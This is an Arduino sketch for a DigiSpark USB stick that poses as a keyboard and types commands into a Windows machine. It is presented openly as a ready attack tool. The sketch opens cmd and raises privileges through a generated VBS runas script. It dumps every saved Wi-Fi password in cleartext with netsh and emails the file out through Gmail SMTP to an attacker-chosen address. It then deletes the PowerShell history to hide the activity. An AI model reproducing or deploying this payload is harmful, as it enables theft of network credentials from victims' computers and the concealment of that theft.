//This DigiSpark script writes the wireless network credentials to a csv file and emails it.
//Credits to p0wc0w.

//NOTE about the New Version of this script: The older script stopped working on newer builds of Windows 10
//since Windows 10 now require an elevated cmd or powershell to execute these commands. This version should
//be faster (better, stronger...) and should work on all builds of Windows 10. For previous versions 
//of Windows or simply older builds of Windows 10, the other version works like a charm.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // The next line gives admin rights to the command prompt
  DigiKeyboard.print(F("set \"params=%*\"; cd /d \"%~dp0\" && ( if exist \"%temp%\getadmin.vbs\" del \"%temp%\getadmin.vbs\" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^(\"Shell.Application\"^) : UAC.ShellExecute \"cmd.exe\", \"/k cd \"\"%~sdp0\"\" && %~s0 %params%\", \"\", \"runas\", 1 >> \"%temp%\getadmin.vbs\" && \"%temp%\getadmin.vbs\" && exit /B )"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //Gives passwords for single word profiles
  DigiKeyboard.print(F("FOR /f \"tokens=5,* skip=9\" %G IN ('netsh wlan show profiles') DO netsh wlan show profile \"%G\" key=clear > temp.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  //Gives passwords for multiple word profiles
  DigiKeyboard.print(F("FOR /f \"tokens=5,* skip=9\" %G IN ('netsh wlan show profiles') DO netsh wlan show profile \"%G %H\" key=clear >> temp.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //Sends email using SMTP service
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_EMAIL', 'GMAIL_PASS'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'GMAIL_EMAIL'; $ReportEmail.To.Add('EMAIL_TO_SEND_TO'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.txt'); $SMTPInfo.Send($ReportEmail);exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //Deletes history
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  for(;;){ /*empty*/ }
}
